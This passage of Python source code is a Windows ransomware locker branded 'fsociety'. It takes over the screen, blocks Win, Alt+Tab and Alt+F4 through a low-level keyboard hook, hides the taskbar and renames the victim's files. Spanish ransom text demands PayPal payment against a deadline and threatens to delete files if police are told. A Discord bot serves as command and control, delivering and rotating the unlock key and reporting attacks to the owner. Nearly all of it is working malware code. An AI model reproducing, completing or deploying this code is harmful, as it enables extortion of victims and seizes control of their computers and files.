        d, ln, on = item[0], item[1], item[2]
        lp = Path(d) / ln
        if not lp.exists():
            continue
        if str(lp).lower() == str(Path(d) / on).lower():
            continue
        taken = {x.lower() for x in _listdir(d)}
        final = _move(lp, Path(d) / on, taken)   # si ya existe -> 'nombre (2).ext'
        if final is None:
            fallos.append([d, ln, on, _size(lp)])
        else:
            done += 1
        if progress and (i % 25 == 0 or i == total - 1):
            progress(i + 1, total)

    if fallos:
        MANIFEST.write_text(json.dumps({"t": time.time(), "n": len(fallos),
                                        "files": fallos}, ensure_ascii=False),
                            encoding="utf-8")
    else:
        try:
            MANIFEST.unlink()
        except Exception:
            pass
        unregister_icon()
    _refresh_shell()
    return done, len(fallos)


def rescue_scan(targets):
    items = _scan_locked(targets)
    n = 0
    for item in items:
        d, ln, on = item[0], item[1], item[2]
        lp = Path(d) / ln
        if not lp.exists():
            continue
        taken = {x.lower() for x in _listdir(d)}
        if _move(lp, Path(d) / on, taken) is not None:
            n += 1
    if MANIFEST.exists():
        try:
            MANIFEST.unlink()
        except Exception:
            pass
    unregister_icon()
    _refresh_shell()
    return n


# ===========================================================
#  7) FOCO + BLOQUEO DE TECLAS
# ===========================================================

def _hwnd(root):
    try:
        u32 = ctypes.windll.user32
        u32.GetAncestor.restype = ctypes.c_void_p
        u32.GetAncestor.argtypes = [ctypes.c_void_p, ctypes.c_uint]
        return u32.GetAncestor(root.winfo_id(), 2)
    except Exception:
        return None


def force_foreground(root):
    if os.name != "nt":
        return
    try:
        u32 = ctypes.windll.user32
        h = _hwnd(root)
        if not h:
            return
        for fn in ("SetForegroundWindow", "SetFocus", "BringWindowToTop"):
            getattr(u32, fn).argtypes = [ctypes.c_void_p]
        u32.ShowWindow.argtypes = [ctypes.c_void_p, ctypes.c_int]
        u32.keybd_event(0x12, 0, 0, 0)
        u32.keybd_event(0x12, 0, 2, 0)
        u32.ShowWindow(h, 5)
        u32.BringWindowToTop(h)
        u32.SetForegroundWindow(h)
        u32.SetFocus(h)
    except Exception:
        pass


def start_key_blocker():
    if os.name != "nt":
        return

    def worker():
        while True:
            try:
                import ctypes.wintypes as wt
                u32 = ctypes.WinDLL("user32", use_last_error=True)
                k32 = ctypes.WinDLL("kernel32", use_last_error=True)
                LRESULT = ctypes.c_ssize_t
                HOOKPROC = ctypes.WINFUNCTYPE(LRESULT, ctypes.c_int, wt.WPARAM, wt.LPARAM)

                class KBD(ctypes.Structure):
                    _fields_ = [("vkCode", wt.DWORD), ("scanCode", wt.DWORD),
                                ("flags", wt.DWORD), ("time", wt.DWORD),
                                ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))]

                u32.CallNextHookEx.restype = LRESULT
                u32.CallNextHookEx.argtypes = [ctypes.c_void_p, ctypes.c_int,
                                               wt.WPARAM, wt.LPARAM]
                u32.GetAsyncKeyState.restype = ctypes.c_short
                u32.SetWindowsHookExW.restype = ctypes.c_void_p
                u32.SetWindowsHookExW.argtypes = [ctypes.c_int, HOOKPROC,
                                                  ctypes.c_void_p, wt.DWORD]
                u32.GetMessageW.argtypes = [ctypes.POINTER(wt.MSG), ctypes.c_void_p,
                                            wt.UINT, wt.UINT]

                def proc(nCode, wParam, lParam):
                    try:
                        if nCode == 0:
                            kb = ctypes.cast(lParam, ctypes.POINTER(KBD)).contents
                            vk = kb.vkCode
                            if vk in (0x5B, 0x5C):
                                return 1
                            alt = u32.GetAsyncKeyState(0x12) & 0x8000
                            ctrl = u32.GetAsyncKeyState(0x11) & 0x8000
                            if vk == 0x1B and ctrl:
                                return 1
                            if HARD_MODE and alt:
                                if vk in (0x09, 0x1B, 0x73):
                                    return 1
                    except Exception:
                        pass
                    return u32.CallNextHookEx(None, nCode, wParam, lParam)

                keep = HOOKPROC(proc)
                if not u32.SetWindowsHookExW(13, keep, k32.GetModuleHandleW(None), 0):
                    time.sleep(0.5)
                    continue
                msg = wt.MSG()
                while u32.GetMessageW(ctypes.byref(msg), None, 0, 0) > 0:
                    u32.TranslateMessage(ctypes.byref(msg))
                    u32.DispatchMessageW(ctypes.byref(msg))
            except Exception:
                pass
            time.sleep(0.5)

    threading.Thread(target=worker, daemon=True).start()


# ===========================================================
#  8) BOT DISCORD
# ===========================================================

class DiscordBot:
    API = "https://discord.com/api/v10"

    def __init__(self, token, on_key=None, on_info=None, log=None):
        self.token = token
        self.on_key = on_key
        self.on_info = on_info
        self.log = log or (lambda s: print(s, flush=True))
        self.canales = []
        self.ultimo = {}
        self.refrescar_en = 0
        self.vivo = True
        self._vig_init = False
        self._vig_ex = False
        self._vig_sig = None

    def _req(self, metodo, ruta, cuerpo=None):
        import urllib.request
        import urllib.error
        data = json.dumps(cuerpo).encode() if cuerpo is not None else None
        req = urllib.request.Request(self.API + ruta, data=data, method=metodo)
        req.add_header("Authorization", f"Bot {self.token}")
        req.add_header("User-Agent", "fsociety-locker/9 (python)")
        if data:
            req.add_header("Content-Type", "application/json")
        try:
            with urllib.request.urlopen(req, timeout=15) as r:
                raw = r.read()
                return r.status, (json.loads(raw) if raw else None)
        except urllib.error.HTTPError as e:
            raw = e.read()
            try:
                return e.code, json.loads(raw)
            except Exception:
                return e.code, None
        except Exception:
            return 0, None

    def quien_soy(self):
        st, d = self._req("GET", "/users/@me")
        return d if st == 200 and isinstance(d, dict) else None

    def buscar_canales(self):
        out = []
        st, guilds = self._req("GET", "/users/@me/guilds")
        if st == 200 and isinstance(guilds, list):
            for g in guilds[:8]:
                st, chs = self._req("GET", f"/guilds/{g['id']}/channels")
                if st != 200 or not isinstance(chs, list):
                    continue
                for c in chs:
                    if c.get("type") in (0, 5):
                        out.append(c["id"])
        st, dms = self._req("GET", "/users/@me/channels")
        if st == 200 and isinstance(dms, list):
            for c in dms:
                if c.get("type") == 1:
                    out.append(c["id"])
        return out[:16]

    def revisar(self, cid, yo):
        after = self.ultimo.get(cid)
        q = "?limit=1" if after is None else f"?limit=5&after={after}"
        st, msgs = self._req("GET", f"/channels/{cid}/messages{q}")
        if st == 429 and isinstance(msgs, dict):
            time.sleep(float(msgs.get("retry_after", 1.0)))
            return
        if st != 200 or not isinstance(msgs, list) or not msgs:
            return
        msgs.sort(key=lambda m: int(m["id"]))
        self.ultimo[cid] = msgs[-1]["id"]
        if after is None:
            return
        for m in msgs:
            if (m.get("author") or {}).get("id") == yo:
                continue
            txt = (m.get("content") or "").strip()
            if txt:
                self.responder(cid, txt, m)

    # ---------- utilidades ----------

    def _di(self, cid, texto, ref=None):
        cuerpo = {"content": texto}
        if ref:
            cuerpo["message_reference"] = {"message_id": ref}
        self._req("POST", f"/channels/{cid}/messages", cuerpo)

    def _avisar(self, texto):
        if self.on_info:
            try:
                self.on_info(texto)
            except Exception:
                pass

    def revelar(self):
        """Marca la clave como ENTREGADA (aparece en pantalla) y la devuelve."""
        c = cur_code()
        STATE["key_shown"] = c
        save_config()
        if self.on_key:
            try:
                self.on_key(c)
            except Exception:
                pass
        return c

    def notify(self, texto):
        dest = NOTIFY_CHANNEL
        if not dest and OWNER_ID:
            st, dm = self._req("POST", "/users/@me/channels", {"recipient_id": OWNER_ID})
            if st in (200, 201) and isinstance(dm, dict):
                dest = dm["id"]
        if not dest:
            if not self.canales:
                self.canales = self.buscar_canales()
            dest = self.canales[0] if self.canales else None
        if dest:
            self._req("POST", f"/channels/{dest}/messages", {"content": texto})

    def estado(self):
        try:
            d = json.loads(MANIFEST.read_text(encoding="utf-8"))
            el = int(time.time() - d.get("t", time.time()))
            return (f"🔒 secuestrado · {d.get('n', 0)} archivos · "
                    f"{el // 3600:02d}:{(el % 3600) // 60:02d}:{el % 60:02d}")
        except Exception:
            return "🔓 libre (sin manifest)"

    # ---------- comandos ----------

    def responder(self, cid, txt, msg):
        low = txt.lower().strip()
        partes = txt.strip().split()
        cmd = partes[0].lower() if partes else ""
        autor = (msg.get("author") or {}).get("id") or ""

        if cmd in ("!code", "!clave", "!key", "!codigo"):
            c = self.revelar()
            texto = f"🔑 clave entregada: `{c}`"
            if low.endswith("dm") or " dm" in low:
                st, dm = self._req("POST", "/users/@me/channels", {"recipient_id": autor})
                if st in (200, 201) and isinstance(dm, dict):
                    self._req("POST", f"/channels/{dm['id']}/messages", {"content": texto})
                    return
            self._di(cid, texto, msg["id"])

        elif cmd in ("!setcode", "!setclave", "!nuevacode"):
            if OWNER_ID and autor != OWNER_ID:
                self._di(cid, "⛔ solo el dueño puede cambiar la clave", msg["id"])
                return
            if len(partes) < 2:
                self._di(cid, "uso: `!setcode NUEVACLAVE`", msg["id"])
                return
            nuevo = " ".join(partes[1:]).strip()
            STATE["code"] = nuevo
            STATE["key_shown"] = ""      # no se muestra hasta que uses !code
            save_config()
            self._avisar(f"clave cambiada a '{nuevo}'")
            self._di(cid, f"✅ clave cambiada a `{nuevo}` (usa `!code` para entregarla)",
                     msg["id"])

        elif cmd in ("!reset", "!rotar"):
            STATE["key_shown"] = ""
            STATE["code"] = new_code()
            save_config()
            self._avisar(f"clave rotada a '{cur_code()}'")
            self._di(cid, f"♻️ clave nueva: `{cur_code()}` (usa `!code` para entregarla)",
                     msg["id"])

        elif cmd == "!id":
            self._di(cid, f"id de este canal: `{cid}`", msg["id"])

        elif cmd in ("!status", "!info", "!ataque"):
            self._di(cid, f"{self.estado()}\nclave activa: `{cur_code()}`", msg["id"])

        elif cmd == "!ping":
            self._di(cid, "pong 🏓", msg["id"])

        elif cmd in ("!help", "!ayuda"):
            self._di(cid,
                     "`!code` entrega la clave (aparece en pantalla)\n"
                     "`!setcode NUEVA` cambia la clave · `!reset` rota clave\n"
                     "`!status` estado · `!id` id del canal · `!ping`",
                     msg["id"])

    # ---------- vigia de ataque ----------

    def _vigilar(self):
        if not NOTIFY_ON_ATTACK:
            return
        ex = MANIFEST.exists()
        sig = None
        if ex:
            try:
                d = json.loads(MANIFEST.read_text(encoding="utf-8"))
                sig = (int(d.get("n", 0)), int(d.get("t", 0)))
            except Exception:
                sig = None
        if not self._vig_init:
            self._vig_init = True
            self._vig_ex, self._vig_sig = ex, sig
            if ex and sig:
                self.notify(f"🔴 ATAQUE EN CURSO\narchivos: `{sig[0]}`\n"
                            f"clave: `{cur_code()}`\nentrega: `!code`")
            return
        if ex != self._vig_ex or (ex and sig != self._vig_sig):
            self._vig_ex, self._vig_sig = ex, sig
            if ex and sig:
                self.notify(f"🔴 NUEVO ATAQUE\narchivos: `{sig[0]}`\n"
                            f"clave: `{cur_code()}`\nentrega: `!code`")
            elif not ex:
                self.notify("✅ archivos restaurados · clave consumida")

    def correr(self):
        if not self.token:
            self.log("[bot] sin token.")
            return
        yo = self.quien_soy()
        if not yo:
            self.log("[bot] token invalido o sin internet.")
            return
        self.log(f"[bot] conectado como {yo.get('username')}")
        self.canales = self.buscar_canales()
        self.log(f"[bot] vigilando {len(self.canales)} canales. escribe !code")
        while self.vivo:
            try:
                load_config()                      # <- clave fresca de otros procesos
                if time.time() > self.refrescar_en:
                    self.refrescar_en = time.time() + 300
                    if not self.canales:
                        self.canales = self.buscar_canales()
                self._vigilar()
                for cid in list(self.canales):
                    try:
                        self.revisar(cid, yo["id"])
                    except Exception:
                        pass
            except Exception:
                pass
            time.sleep(3.0)


_BOT = None


def start_bot(token=None):
    global _BOT
    if _BOT is not None:
        return
    tok = token or DISCORD_TOKEN
    if not tok:
        return
    _BOT = DiscordBot(tok,
                      on_key=lambda c: BOT_Q.put(("key", c)),
                      on_info=lambda t: BOT_Q.put(("info", t)))
    threading.Thread(target=_BOT.correr, daemon=True).start()


def bot_notify(texto):
    if _BOT is not None:
        threading.Thread(target=_BOT.notify, args=(texto,), daemon=True).start()


# ===========================================================
#  9) INTERFAZ
# ===========================================================

def pick_family(root):
    try:
        import tkinter.font as tkfont
        fams = set(tkfont.families(root))
        for f in ("Consolas", "Cascadia Mono", "Lucida Console", "Courier New",
                  "DejaVu Sans Mono", "Liberation Mono", "Menlo", "Monaco"):
            if f in fams:
                return f
    except Exception:
        pass
    return "TkFixedFont"


class GUI:
    def __init__(self, root, targets, already_locked, count=0, since=None):
        import tkinter as tk
        self.tk = tk
        self.root = root
        self.targets = targets
        self.count = count
        self.since = since or time.time()
        self.attempts = 0
        self.done = False
        self.locking = not already_locked
        self.unlocking = False
        self.pending = None
        self.pay_mode = False
        self.key_shown = STATE.get("key_shown") or None
        if self.locking:                       # ATAQUE NUEVO: nada visible hasta !code
            self.key_shown = None
        self.q = queue.Queue()
        self.fam = pick_family(root)
        self.barpos = 0

        sh = root.winfo_screenheight()
        self.compact = sh < 840
        b = 9 if self.compact else 11
        self.f_mono = (self.fam, b)
        self.f_small = (self.fam, max(8, b - 1))
        self.f_big = (self.fam, b + 1, "bold")
        self.f_ent = (self.fam, 19 if self.compact else 22, "bold")

        self._build()
        self.root.after(120, lambda: self._type(0))
        self.root.after(400, self._watchdog)
        self.root.after(80, self._poll)
        self.root.after(200, self._poll_bot)
        self.root.after(1200, self._sync_state)
        self.root.after(500, self._blink)
        self.root.after(1500, self._glitch)
        self._tick()
        if self.locking:
            threading.Thread(target=self._lock_worker, daemon=True).start()

    # ---------------- layout ----------------

    def _build(self):
        tk = self.tk
        r = self.root
        r.title("fsociety")
        r.configure(bg=BLACK)
        r.overrideredirect(True)
        r.geometry(f"{r.winfo_screenwidth()}x{r.winfo_screenheight()}+0+0")
        r.attributes("-topmost", True)
        r.protocol("WM_DELETE_WINDOW", lambda: None)

        edge = tk.Frame(r, bg=RD)
        edge.pack(fill="both", expand=True)
        outer = tk.Frame(edge, bg=BLACK)
        outer.pack(fill="both", expand=True, padx=2, pady=2)

        # ---- pie (input) ----
        foot = tk.Frame(outer, bg="#0d0002", highlightbackground=RD_MID, highlightthickness=1)
        foot.pack(side="bottom", fill="x")
        left_accent = tk.Frame(foot, bg=RD, width=4)
        left_accent.pack(side="left", fill="y")
        tk.Label(foot, text="  CLAVE", bg="#0d0002", fg=RD,
                 font=self.f_big).pack(side="left", padx=(18, 10), pady=13)
        self.entry = tk.Entry(foot, width=16, justify="center", font=self.f_ent,
                              bg="#1c0004", fg="#ffffff", insertbackground=RD,
                              relief="flat", highlightthickness=2,
                              highlightbackground=RD_DIM, highlightcolor=RD)
        self.entry.pack(side="left", pady=13)
        self.entry.bind("<Return>", self.submit)
        self.entry.bind("<KP_Enter>", self.submit)
        tk.Label(foot, text="ENTER", bg="#0d0002", fg=RD_DIM,
                 font=self.f_small).pack(side="left", padx=12)
        self.status = tk.Label(foot, text="", bg="#0d0002", fg=ACC, font=self.f_big)
        self.status.pack(side="right", padx=22)

        # ---- barra superior ----
        top = tk.Frame(outer, bg=RD_DARK, height=26)
        top.pack(side="top", fill="x")
        tk.Label(top, text="  ▚▞ FSOCIETY://LOCKER", bg=RD_DARK, fg=RD,
                 font=self.f_small).pack(side="left", pady=4)
        self.top_timer = tk.Label(top, text="", bg=RD_DARK, fg=ACC, font=self.f_small)
        self.top_timer.pack(side="right", padx=14)
        tk.Label(top, text="Ctrl+Shift+Q = salir   ", bg=RD_DARK, fg=RD_MID,
                 font=self.f_small).pack(side="right")

        # ---- cuerpo ----
        body = tk.Frame(outer, bg=BLACK)
        body.pack(side="top", fill="both", expand=True, padx=30, pady=16)

        left = tk.Frame(body, bg=BLACK)
        left.pack(side="left", fill="both", expand=True)

        head = tk.Frame(left, bg=BLACK)
        head.pack(anchor="w")
        fp = 128 if self.compact else 172
        self.face_img = None
        if build_face(px=fp * 2):
            try:
                self.face_img = tk.PhotoImage(file=str(FACE))
                tk.Label(head, image=self.face_img, bg=BLACK, bd=0).pack(side="left")
            except Exception:
                self.face_img = None
        hr = tk.Frame(head, bg=BLACK)
        hr.pack(side="left", padx=(28, 0))
        self.title = tk.Label(hr, text="F S O C I E T Y", bg=BLACK, fg=RD,
                              font=(self.fam, 20 if self.compact else 27, "bold"))
        self.title.pack(anchor="w", pady=(20 if not self.compact else 8, 0))
        tk.Label(hr, text='"hello, friend."', bg=BLACK, fg=RD_MID,
                 font=self.f_mono).pack(anchor="w")
        tk.Label(hr, text="5 / 9 / 2015", bg=BLACK, fg=ACC_DIM,
                 font=self.f_small).pack(anchor="w")

        sep = tk.Frame(left, bg=RD_DARK, height=1)
        sep.pack(fill="x", pady=(14, 12))

        self.txt = tk.Text(left, bg=BLACK, fg=RD, font=self.f_mono, wrap="word",
                           relief="flat", borderwidth=0, highlightthickness=0,
                           takefocus=False, cursor="arrow", height=4, padx=0, pady=0)
        self.txt.pack(fill="both", expand=True)
        for tag, col in (("green", RD), ("dim", RD_DIM), ("red", ACC),
                         ("white", "#ffd9dd"), ("mid", RD_MID)):
            self.txt.tag_config(tag, foreground=col)
        self.txt.bind("<Button-1>", lambda e: self._focus_entry())

        self.bar = tk.Label(left, text="", bg=BLACK, fg=RD_DIM,
                            font=self.f_small, anchor="w")
        self.bar.pack(fill="x", pady=(12, 0))

        self._build_panel(body)

        r.bind("<Escape>", lambda e: self._help())
        r.bind("<Control-Shift-Q>", lambda e: self._hard_close())
        r.bind("<Control-Shift-q>", lambda e: self._hard_close())
        r.bind_all("<Key>", self._any_key)
        r.bind("<Button-1>", lambda e: self._focus_entry())

        try:
            r.grab_set()
        except Exception:
            pass
        r.update_idletasks()
        r.update()
        if HIDE_TASKBAR:
            taskbar(False)
        force_foreground(r)
        self._focus_entry()

    def _build_panel(self, parent):
        tk = self.tk
        p = tk.Frame(parent, bg="#0a0002", highlightbackground=RD, highlightthickness=2)
        p.pack(side="right", fill="y", padx=(26, 0), ipadx=20, ipady=14)

        tk.Label(p, text="▚ RESCATE ▞", bg="#0a0002", fg=RD,
                 font=(self.fam, 11 if self.compact else 14, "bold")).pack()
        tk.Label(p, text=f"{RANSOM_AMOUNT} {RANSOM_CURR}", bg="#0a0002", fg="#ffffff",
                 font=(self.fam, 17 if self.compact else 22, "bold")).pack(pady=(2, 10))

        if SHOW_QR and build_qr(maxpx=150 if self.compact else 185):
            try:
                self.qr_img = tk.PhotoImage(file=str(QRPNG))
                tk.Label(p, image=self.qr_img, bg="#0a0002", bd=0).pack()
            except Exception:
                pass

        tk.Label(p, text="pago al correo", bg="#0a0002", fg=RD_DIM,
                 font=self.f_small).pack(pady=(10, 0))
        tk.Label(p, text=PAYPAL_EMAIL, bg="#0a0002", fg=RD,
                 font=self.f_small, wraplength=180).pack()

        tk.Button(p, text="► PAGAR", command=self._pay, bg=RD_DARK, fg=RD,
                  activebackground=RD, activeforeground=BLACK, relief="flat",
                  font=self.f_big, highlightthickness=1,
                  highlightbackground=RD).pack(fill="x", pady=(12, 5))
        tk.Button(p, text="✓ YA PAGUE", command=self._verify, bg="#0a0002", fg=RD_MID,
                  activebackground=RD, activeforeground=BLACK, relief="flat",
                  font=self.f_small, highlightthickness=1,
                  highlightbackground=RD_DIM).pack(fill="x")

        tk.Frame(p, bg=RD_DARK, height=1).pack(fill="x", pady=(14, 8))

        self.deadline = tk.Label(p, text="", bg="#0a0002", fg=ACC, font=self.f_small)
        self.deadline.pack()

        tk.Frame(p, bg=ACC_DIM, height=1).pack(fill="x", pady=(10, 8))

        tk.Label(p, text="CLAVE ENTREGADA", bg="#0a0002", fg=RD_DIM,
                 font=self.f_small).pack()
        self.key_lbl = tk.Label(p, text="· · ·", bg="#0a0002",
                                fg=RD_DARK,
                                font=(self.fam, 15 if self.compact else 18, "bold"),
                                cursor="hand2")
        self.key_lbl.pack(pady=(4, 0))
        self.key_lbl.bind("<Button-1>", lambda e: self._use_key())
        self.key_hint = tk.Label(p, text=("(escribe !code en discord)" if UI_VERBOSE else ""),
                                 bg="#0a0002", fg=RD_DARK, font=self.f_small)
        self.key_hint.pack(pady=(4, 0))
        if self.key_shown:
            self._render_key(self.key_shown)

    # ---------------- texto ----------------

    def _append(self, text, tag="green"):
        self.txt.insert("end", text, tag)
        self.txt.see("end")

    def _line(self, text, tag="green"):
        self._append(text + "\n", tag)

    def _reveal(self, text, tag, i, done):
        if i >= len(text):
            done()
            return
        nl = text.find("\n", i)
        chunk = text[i:i + 3] if nl < 0 or nl > i + 3 else text[i:nl + 1]
        self._append(chunk, tag)
        self.root.after(7, lambda: self._reveal(text, tag, i + len(chunk), done))

    def _type(self, i):
        if UI_VERBOSE:
            script = [
                ("[ fsociety ] conexion establecida.", "dim"),
                ("escaneando unidades...", "dim"),
                ("", "green"),
                ("hemos tomado tus archivos.", "white"),
                ("tus archivos estan secuestrados.", "green"),
                ("si reportas a la policia, borraremos tus archivos.", "dim"),
                ("", "green"),
                ("PARA RECUPERARLOS HAY QUE PAGAR.", "red"),
                ("paga al correo y luego te enviaremos la clave.", "mid"),
                ("la clave aparecera aqui o en el panel derecho.", "green"),
            ]
        else:
            script = [
                ("[ fsociety ] conexion establecida.", "dim"),
                ("", "green"),
                ("hemos tomado tus archivos.", "white"),
                ("tus archivos estan secuestrados.", "green"),
                ("", "green"),
                ("PARA RECUPERARLOS HAY QUE PAGAR.", "red"),
            ]
        if i >= len(script):
            return
        text, tag = script[i]
        self._reveal(text + "\n", tag, 0, lambda: self._type(i + 1))

    # ---------------- clave ----------------

    def _render_key(self, c):
        try:
            self.key_lbl.config(text=c, fg=RD)
            self.key_hint.config(text="(clic para rellenar)" if UI_VERBOSE else "")
        except Exception:
            pass

    def _clear_key(self):
        try:
            self.key_lbl.config(text="· · ·", fg=RD_DARK)
            self.key_hint.config(text="(escribe !code en discord)" if UI_VERBOSE else "")
        except Exception:
            pass

    def _sync_state(self):
        """Relee config.json: cambios hechos desde OTRO proceso (bot aparte)."""
        if self.done:
            return
        if load_config():
            self.key_shown = STATE.get("key_shown") or None
            if self.key_shown:
                self._render_key(self.key_shown)
            else:
                self._clear_key()
        self.root.after(1200, self._sync_state)

    def _poll_bot(self):
        if self.done:
            return
        try:
            while True:
                kind, val = BOT_Q.get_nowait()
                if kind == "key":
                    self.key_shown = val
                    self._render_key(val)
                    if UI_VERBOSE:
                        self._line(f"[ bot ] clave entregada: {val}", "mid")
                    self._flash(0)
                elif kind == "info":
                    if UI_VERBOSE:
                        self._line(f"[ bot ] {val}", "mid")
        except queue.Empty:
            pass
        self.root.after(400, self._poll_bot)

    def _flash(self, k):
        if self.done or self.key_shown is None:
            return
        if k >= 8:
            try:
                self.key_lbl.config(fg=RD)
            except Exception:
                pass
            return
        try:
            self.key_lbl.config(fg=("#ffffff", RD)[k % 2])
        except Exception:
            pass
        self.root.after(130, lambda: self._flash(k + 1))

    def _use_key(self):
        if self.key_shown and not self.locking and not self.unlocking:
            self.entry.delete(0, "end")
            self.entry.insert(0, self.key_shown)
            self._focus_entry()

    # ---------------- teclado ----------------

    def _any_key(self, event):
        if self.done or self.unlocking:
            return
        if event.widget is self.entry:
            return
        ks = event.keysym
        if ks in ("Return", "KP_Enter"):
            self.submit()
            return "break"
        if ks == "BackSpace":
            s = self.entry.get()
            if s:
                self.entry.delete(len(s) - 1, "end")
            return "break"
        ch = event.char
        if ch and ch.isprintable():
            self.entry.insert("end", ch)
            self.entry.focus_set()
            return "break"

    def _focus_entry(self):
        if self.done or self.unlocking:
            return
        try:
            self.entry.focus_set()
        except Exception:
            pass

    def _help(self):
        if UI_VERBOSE:
            self._line("  Alt+F4/Alt+Tab/Win bloqueados · Ctrl+Shift+Q sale", "dim")

    # ---------------- barra ----------------

    def _barra(self, texto, pct=None):
        try:
            if pct is None:
                self.barpos = (self.barpos + 1) % 24
                bl = ["░"] * 24
                for k in range(6):
                    bl[(self.barpos + k) % 24] = "█"
                self.bar.config(text="  " + "".join(bl) + "  " + texto, fg=RD_MID)
            else:
                llen = int(24 * pct)
                self.bar.config(text="  " + "█" * llen + "░" * (24 - llen) + "  " + texto,
                                fg=RD)
        except Exception:
            pass

    # ---------------- hilos ----------------

    def _lock_worker(self):
        try:
            n = lock(self.targets, progress=lambda k: self.q.put(("prog", k)))
            self.q.put(("done", n))
        except Exception as e:
            self.q.put(("err", str(e)))

    def _unlock_worker(self):
        try:
            n, f = unlock(self.targets, progress=lambda a, b: self.q.put(("uprog", (a, b))))
            if n > 0 and ROTATE_ON_UNLOCK and not f:
                STATE["key_shown"] = ""          # clave consumida
                STATE["code"] = new_code()        # rotar para el proximo ataque
                save_config()
            self.q.put(("udone", (n, f)))
        except Exception as e:
            self.q.put(("uerr", str(e)))

    def _poll(self):
        if self.done:
            return
        try:
            while True:
                kind, val = self.q.get_nowait()
                if kind == "prog":
                    self._barra(f"{val} archivos secuestrados")
                elif kind == "done":
                    self.count = val
                    self.since = time.time()
                    self.locking = False
                    self._barra(f"{val} archivos secuestrados", 1.0)
                    if UI_VERBOSE:
                        self._line(f"[ ok ] {val} archivos secuestrados.", "green")
                    if self.pending:
                        p = self.pending
                        self.pending = None
                        self.entry.delete(0, "end")
                        self.entry.insert(0, p)
                        self.submit()
                elif kind == "uprog":
                    a, b = val
                    self._barra(f"restaurando {a}/{b}", a / max(1, b))
                elif kind == "udone":
                    n, f = val
                    self.unlocking = False
                    self._barra(f"restaurados {n}", 1.0)
                    if UI_VERBOSE:
                        self._line("")
                        self._line(f"[ ok ] {n} archivos restaurados.", "green")
                        if f:
                            self._line(f"[ !! ] {f} pendientes (reejecuta)", "red")
                        self._line("[ ok ] el pueblo libre. nos vemos, friend.", "dim")
                    if f:
                        self.status.config(text=f"{f} pendientes - vuelve a ejecutar", fg=ACC)
                    else:
                        self.root.after(1600, self._really_quit)
                elif kind == "err":
                    self.locking = False
                    self._line(f"[ !! ] error: {val}", "red")
                elif kind == "uerr":
                    self.unlocking = False
                    self._line(f"[ !! ] error: {val}", "red")
        except queue.Empty:
            pass
        self.root.after(80, self._poll)

    # ---------------- acciones ----------------

    def _pay(self):
        self.pay_mode = True
        try:
            self.root.attributes("-topmost", False)
        except Exception:
            pass
        try:
            webbrowser.open(pay_url(True))
        except Exception:
            pass
        if UI_VERBOSE:
            self._line("[ paypal ] abriendo el pago... ", "dim")

    def _verify(self):
        if getattr(self, "_verifying", False):
            return
        self._verifying = True
        self._spin(0, 14)

    def _spin(self, i, total):
        if self.done:
            return
        frames = "|/-\\"
        if i >= total:
            self._verifying = False
            self.status.config(text="Pago en revision -> se te dara la clave al confirmar", fg=RD)
            if UI_VERBOSE:
                self._line("[ ok ] pago pendiente de confirmacion.", "green")
            self._focus_entry()
            return
        self.status.config(text=f"verificando {frames[i % 4]}", fg=RD_DIM)
        self.root.after(170, lambda: self._spin(i + 1, total))

    def _blink(self):
        if self.done:
            return
        try:
            cur = self.entry.cget("highlightbackground")
            self.entry.config(highlightbackground=RD if cur != RD else RD_DIM)
        except Exception:
            pass
        self.root.after(600, self._blink)

    def _glitch(self):
        if self.done:
            return
        try:
            base = "F S O C I E T Y"
            t = list(base)
            for _ in range(random.randint(1, 3)):
                i = random.randrange(len(t))
                if t[i] != " ":
                    t[i] = random.choice("!@#$%&/\\|<>_")
            self.title.config(text="".join(t))
            self.root.after(90, lambda: self.title.config(text=base))
        except Exception:
            pass
        self.root.after(random.randint(1800, 3400), self._glitch)

    def _tick(self):
        if self.done:
            return
        el = int(time.time() - self.since)
        try:
            self.top_timer.config(text=f"SECUESTRADO {el // 3600:02d}:{(el % 3600) // 60:02d}:{el % 60:02d}  ")
        except Exception:
            pass
        left = max(0, DEADLINE_H * 3600 - el)
        try:
            self.deadline.config(text=f"oferta expira en {left // 3600:02d}:{(left % 3600) // 60:02d}:{left % 60:02d}")
        except Exception:
            pass
        self.root.after(1000, self._tick)

    def _watchdog(self):
        if self.done:
            return
        try:
            if os.name == "nt":
                u32 = ctypes.windll.user32
                u32.GetForegroundWindow.restype = ctypes.c_void_p
                fg = u32.GetForegroundWindow()
                h = _hwnd(self.root)
                if self.pay_mode:
                    if fg == h:
                        self.pay_mode = False
                        self.root.attributes("-topmost", True)
                        force_foreground(self.root)
                else:
                    self.root.attributes("-topmost", True)
                    if fg != h:
                        force_foreground(self.root)
                    if HIDE_TASKBAR:
                        taskbar(False)
        except Exception:
            pass
        self.root.after(600, self._watchdog)

    # ---------------- enviar ----------------

    def submit(self, event=None):
        if self.done or self.unlocking:
            return
        val = self.entry.get().strip()
        if not val:
            return
        if self.locking:
            self.pending = val
            self.status.config(text="espera... terminando de secuestrar", fg=RD_DIM)
            return
        if val.lower() == cur_code().lower():
            self.unlocking = True
            self.status.config(text=">> ACCESS GRANTED <<", fg=RD)
            self.entry.config(state="disabled")
            self.root.update_idletasks()
            if UI_VERBOSE:
                self._line("")
                self._line("restaurando archivos...", "mid")
            threading.Thread(target=self._unlock_worker, daemon=True).start()
        else:
            self.attempts += 1
            msg = f">> ACCESS DENIED <<  ({self.attempts})"
            if self.attempts == 3:
                msg += f"   pista: {len(cur_code())} letras, '{cur_code()[0].upper()}...'"
            self.status.config(text=msg, fg=ACC)
            self.entry.delete(0, "end")
            try:
                self.root.bell()
            except Exception:
                pass

    def _hard_close(self):
        self.done = True
        self._really_quit()

    def _really_quit(self):
        if HIDE_TASKBAR:
            taskbar(True)
        try:
            self.root.grab_release()
        except Exception:
            pass
        self.root.destroy()


def gui_main(targets, already_locked, count=0, since=None):
    try:
        import tkinter as tk
    except ImportError:
        print("tkinter no disponible.")
        return
    ensure_assets()
    if BLOCK_WIN_KEY:
        start_key_blocker()
    if BOT_AUTOSTART:
        start_bot()
    root = tk.Tk()
    GUI(root, targets, already_locked, count, since)
    root.mainloop()


# ===========================================================
#  10) CLI
# ===========================================================

def main():
    global CODE
    ap = argparse.ArgumentParser(description="fsociety locker v9")
    ap.add_argument("--unlock", action="store_true")
    ap.add_argument("--gui", action="store_true")
    ap.add_argument("--bot", action="store_true")
    ap.add_argument("--rescue", action="store_true")
    ap.add_argument("--verify", action="store_true")
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--no-gui", action="store_true")
    ap.add_argument("--rebuild", action="store_true")
    ap.add_argument("--install", action="store_true")
